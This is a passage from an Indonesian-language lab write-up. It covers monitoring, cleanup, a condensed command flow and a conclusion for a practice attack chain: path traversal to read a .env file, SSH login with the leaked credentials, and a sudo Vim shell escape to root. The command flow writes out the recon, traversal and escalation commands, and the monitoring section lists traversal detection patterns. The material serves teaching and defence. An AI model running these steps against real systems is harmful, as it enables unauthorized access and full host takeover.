Apabila operator hanya perlu mengedit file tertentu, gunakan mekanisme yang lebih sempit seperti `sudoedit` dengan path eksplisit dan permission yang ketat.

---

## 22.6 Monitoring

Deteksi request dengan pola:

```text
../
..%2F
..%252F
.env
/etc/passwd
```

Pantau juga:

```text
Login SSH dari sumber tidak biasa
Kegagalan login setelah akses web mencurigakan
Eksekusi sudo Vim
Shell yang menjadi child process dari Vim
```

---

# 23. Cleanup Lab

Karena pengujian tidak memasang persistence, cleanup cukup:

```bash
exit
```

Keluar dari Vim:

```vim
:q!
```

Hapus evidence lokal yang mengandung password mentah atau sanitasi file sebelum dibagikan.

Tidak perlu:

```text
Membuat atau menghapus user
Mengubah sudoers
Menghapus log target
Memodifikasi aplikasi
```

---

# 24. Command Flow Ringkas

```bash
# Variabel
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

# 1. Recon
nmap -Pn -sC -sV -p- "$TARGET"

# 2. Content discovery
dirsearch -u "$WEB" -e php,html,txt,bak,old,zip,env

# 3. Baseline file valid
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=uu-1-2024.pdf"

# 4. Baseline file tidak ada
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=missing.pdf"

# 5. Validasi traversal
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"

# 6. Initial access
ssh operator@"$TARGET"

# 7. Validasi user
whoami
id
hostname
pwd

# 8. Enumerasi sudo
sudo -l

# 9. Privilege escalation sesuai temuan lab
sudo vim -c ':!/bin/sh'

# 10. Validasi root
whoami
id
```

Rumus belajar:

```text
SCAN
→ LIHAT APLIKASI
→ TEMUKAN FITUR DOWNLOAD
→ TANGKAP REQUEST NORMAL
→ KENALI PARAMETER FILE
→ BUAT BASELINE
→ UJI TRAVERSAL
→ ANALISIS SECRET
→ HUBUNGKAN DENGAN SSH
→ ENUMERASI SUDO
→ ANALISIS VIM
→ ROOT
```

---

# 25. Kesimpulan

Path traversal pada lab ini tidak ditemukan melalui tebakan acak. Celah ditemukan melalui urutan logis:

```text
1. Nmap menunjukkan aplikasi web dan SSH.
2. Directory enumeration menemukan endpoint download.
3. Interaksi normal dengan aplikasi memperlihatkan parameter file.
4. Bentuk parameter menimbulkan hipotesis bahwa input digunakan sebagai path.
5. Baseline membuktikan perilaku file valid dan file tidak ada.
6. Payload ../.env membuktikan arbitrary file read.
7. Isi .env menyediakan credential operator.
8. Port SSH yang ditemukan saat reconnaissance memberi jalur validasi credential reuse.
9. Login SSH menghasilkan shell sebagai operator.
10. sudo -l mengungkap Vim dapat dijalankan sebagai root.
11. Shell escape Vim menghasilkan uid=0(root).
```

Attack chain final:

```text
Reconnaissance
→ Endpoint Discovery
→ Request Analysis
→ Path Traversal
→ .env Disclosure
→ Credential Reuse
→ SSH Initial Access
→ Sudo Misconfiguration
→ Vim Shell Escape
→ Root
```

Severity akhir:

```text
Critical
```

Alasannya adalah rangkaian kelemahan memungkinkan attacker bergerak dari akses web tanpa autentikasi menjadi pengambilalihan penuh host sebagai root.
